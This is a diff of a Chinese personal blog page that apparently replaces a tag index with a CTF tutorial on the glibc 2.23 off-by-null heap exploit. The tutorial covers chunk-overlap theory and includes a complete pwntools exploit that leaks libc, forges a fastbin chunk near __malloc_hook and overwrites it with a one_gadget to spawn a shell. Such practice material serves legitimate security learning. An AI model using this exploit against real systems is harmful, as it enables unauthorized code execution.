@@ -6,17 +6,26 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Tag: 题目 | Detective_LFY&#39;s Blog</title>
+  <title>例析offbynull | Detective_LFY&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="一个个人博客。">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Detective_LFY&#39;s Blog">
-<meta property="og:url" content="http://example.com/tags/%E9%A2%98%E7%9B%AE/index.html">
+  <meta name="description" content="0.特殊的offbyoneoffbynull是offbyone的一种特殊情况。它的特点是溢出的一字节为NULL字节。与传统的offbyone思路相似，我们也是要通过这溢出的NULL字节来实现chunk overlap，从而实现内存泄漏或是修改堆指针。 1.利用思路">
+<meta property="og:type" content="article">
+<meta property="og:title" content="例析offbynull">
+<meta property="og:url" content="http://example.com/2022/02/23/%E4%BE%8B%E6%9E%90offbynull/index.html">
 <meta property="og:site_name" content="Detective_LFY&#39;s Blog">
-<meta property="og:description" content="一个个人博客。">
+<meta property="og:description" content="0.特殊的offbyoneoffbynull是offbyone的一种特殊情况。它的特点是溢出的一字节为NULL字节。与传统的offbyone思路相似，我们也是要通过这溢出的NULL字节来实现chunk overlap，从而实现内存泄漏或是修改堆指针。 1.利用思路">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/02/23/%E4%BE%8B%E6%9E%90offbynull/1.png">
+<meta property="article:published_time" content="2022-02-23T09:57:22.000Z">
+<meta property="article:modified_time" content="2022-02-23T11:55:17.658Z">
 <meta property="article:author" content="LianFeiyang">
+<meta property="article:tag" content="overlap">
+<meta property="article:tag" content="堆溢出">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="offbynull">
+<meta property="article:tag" content="offbyone">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/02/23/%E4%BE%8B%E6%9E%90offbynull/1.png">
   
     <link rel="alternative" href="/atom.xml" title="Detective_LFY&#39;s Blog" type="application/atom+xml">
   
@@ -153,125 +162,93 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-例析offbynull" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/10/20/%E5%85%B3%E4%BA%8E%E2%80%9C%E9%B2%B2%E9%B9%8F%E6%9D%AF%E2%80%9DCTF%E4%B8%ADpwn-1%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98%E7%9A%84%E6%8E%A2%E8%AE%A8/" class="archive-article-date">
-  	<time datetime="2021-10-20T09:11:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-20</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/10/20/%E5%85%B3%E4%BA%8E%E2%80%9C%E9%B2%B2%E9%B9%8F%E6%9D%AF%E2%80%9DCTF%E4%B8%ADpwn-1%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98%E7%9A%84%E6%8E%A2%E8%AE%A8/">关于“鲲鹏杯”CTF中pwn_1一些问题的探讨</a>
+    <h1 class="article-title" itemprop="name">
+      例析offbynull
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2022/02/23/%E4%BE%8B%E6%9E%90offbynull/" class="archive-article-date">
+  	<time datetime="2022-02-23T09:57:22.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-23</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="0-特殊的offbyone"><a href="#0-特殊的offbyone" class="headerlink" title="0.特殊的offbyone"></a>0.特殊的offbyone</h4><p>offbynull是offbyone的一种特殊情况。它的特点是<strong>溢出的一字节为NULL字节。</strong><br>与传统的offbyone思路相似，我们也是要通过这溢出的NULL字节来实现chunk overlap，从而实现内存泄漏或是修改堆指针。</p>
+<h4 id="1-利用思路"><a href="#1-利用思路" class="headerlink" title="1.利用思路"></a>1.利用思路</h4><span id="more"></span>
+<p>我们知道，当一个大小属于unsortedbin的chunk被释放后，会触发<strong>合并</strong>操作。而向前合并的依据就是该chunk的prev_inuse位为0，并且是通过prev_size字段来找到定位一个chunk的。<br>既然这样，假设我们的堆布局是这样的：<br>有四个申请大小都等于0xf8（实际大小为0x100）的相邻chunk，从低地址向高地址分别为ABCD。假设存在offbynull，则我们可以在B处利用offbynull，使得C的prev_inuse位为0,并同时修改C的prev_size大小为0x200（即A+B的大小）。这样，在释放C后，C就会将A+B视为一个chunk合并。<strong>需要注意的是，在释放C前需要先释放A，否则会报错。</strong><br>这样一来，虽然ABC合并为一个unsortedbin chunk，但是，由于B并没有被真正free掉，因此造成了chunk overlap。</p>
+<p>但是，在实际的利用中，被合并的堆块不一定要是unsortedbin大小的堆块，<strong>也可以是fastbin大小的堆块，便于进行后续的fastbin attack。(但要保证头部的chunk大小必须符合unsortedbin)</strong> 例如，将上述的B换成申请大小为0x68（实际为0x70）的chunk，在ABC合并后，我们可以申请一个实际大小为A+B的chunk，这样根据ptmalloc机制，会将ABC分割并返回AB给我们。这样，堆块AB和堆块B重叠，free掉B，B就会进入fastbin，此时我们还可以访问到它，后续就是fastbin attack了。</p>
+<h4 id="2-例子"><a href="#2-例子" class="headerlink" title="2.例子"></a>2.例子</h4><h5 id="2-1-附件"><a href="#2-1-附件" class="headerlink" title="2-1.附件"></a>2-1.附件</h5><p>点击下载：<a href="offbynull">offbynull</a><br>libc版本为2.23。</p>
+<h5 id="2-2-分析"><a href="#2-2-分析" class="headerlink" title="2-2.分析"></a>2-2.分析</h5><p>漏洞在add函数。<br><img src="/2022/02/23/%E4%BE%8B%E6%9E%90offbynull/1.png"><br>在写入初始content时，会在结尾添加\x00，由于边界检查不严格，导致如果填满的话\x00会溢出，存在offbynull。<br>leak的思路和上一个offbyone相同，不多赘述。</p>
+<p>主要讲讲offbynull的利用。<br><em>不知道为什么，此题如果我合并三个堆块的话就会在free时报错，但是如果合并4个就不会。</em><br>这题我是先申请了五个大小分别为0xf8、0x68、0xf8、0xf8、0xf8（实际大小分别加上0x8）的堆块。先释放掉第三个，再申请回来，申请的同时完成offbyone的利用，使得第四个堆块的prev_size为0x270（即一二三个相加的实际大小），prev_inuse位为0。再依次释放第一、第四个堆块，这样前四个堆块就会合并为一个大小为unsortedbin chunk。此后申请一个大小为0x160（实际0x170）的chunk，就会把第一第二个切下给我们（当成一个堆块）。<strong>此时未被释放的第二个堆块和被当成一个堆块的一二堆块就会发生重叠，</strong>释放掉第二个堆块，它会进入fastbin。之后再fastbin attack即可。</p>
+<p><em>如果一开始没用0x70的堆块，而是同样是0x100的堆块则在上述步骤中需要修改其中一个被合并的堆块size为0x70，并在之后<strong>伪造一个chunk头（保证prev_inuse位为1）</strong>，这样才能伪造一个fastbin chunk释放。后续再利用fastbin attack。</em></p>
+<h5 id="2-3-exp"><a href="#2-3-exp" class="headerlink" title="2-3.exp"></a>2-3.exp</h5><p>完整的exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./offbynull&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">i</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;4:delete&#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size,content</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&#x27;content:&#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;index&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;index&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;index&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x100</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x70</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x100</span>,<span class="string">&#x27;AAAAAAA&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;AAAAAAA\x00&#x27;</span>)</span><br><span class="line">leak=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=leak-<span class="number">0x3c4b78</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">mlh=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc=libc_base+libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">sysaddr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="built_in">hex</span>(mlh))</span><br><span class="line">one=libc_base+<span class="number">0x4527a</span></span><br><span class="line">fake_chunk=mlh-<span class="number">0x23</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0xb</span>+p64(one)+p64(realloc+<span class="number">8</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xf8</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0xf8</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0xf8</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0xf8</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0xf8</span>,<span class="string">b&#x27;B&#x27;</span>*<span class="number">0xf0</span>+p64(<span class="number">0x270</span>))    <span class="comment">#利用offbynull。</span></span><br><span class="line">delete(<span class="number">2</span>)   <span class="comment">#先释放2才不会报错。</span></span><br><span class="line">delete(<span class="number">5</span>)   <span class="comment">#这步后2、3、4、5合并。</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x160</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">delete(<span class="number">3</span>)   <span class="comment">#3进入fastbin。</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">0xf8</span>+p64(<span class="number">0x70</span>)+p64(fake_chunk))</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x60</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x60</span>,payload)</span><br><span class="line">choice(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;size:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">shellcode</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">overlap</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">题目</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">堆溢出</a>
         		</li>
       		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">栈</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">问题探讨</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Ubuntu</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Kali</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/学习//" class="article-tag-list-link color3">学习</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/10/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E4%B8%ADhello-pwn%E7%9A%84%E8%A7%A3%E6%B3%95/" class="archive-article-date">
-  	<time datetime="2021-10-03T15:15:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-03</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/10/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E4%B8%ADhello-pwn%E7%9A%84%E8%A7%A3%E6%B3%95/">攻防世界中hello_pwn的解法</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">PWN</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">栈溢出</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">offbynull</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">题目</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">offbyone</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
@@ -284,17 +261,104 @@
 	</div>
 
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/02/23/%E4%BE%8B%E6%9E%90offbynull/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/2022/02/22/%E4%BE%8B%E6%9E%90%E4%BC%A0%E7%BB%9F%E7%9A%84offbyone/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">例析传统的offbyone</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -317,9 +381,9 @@
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
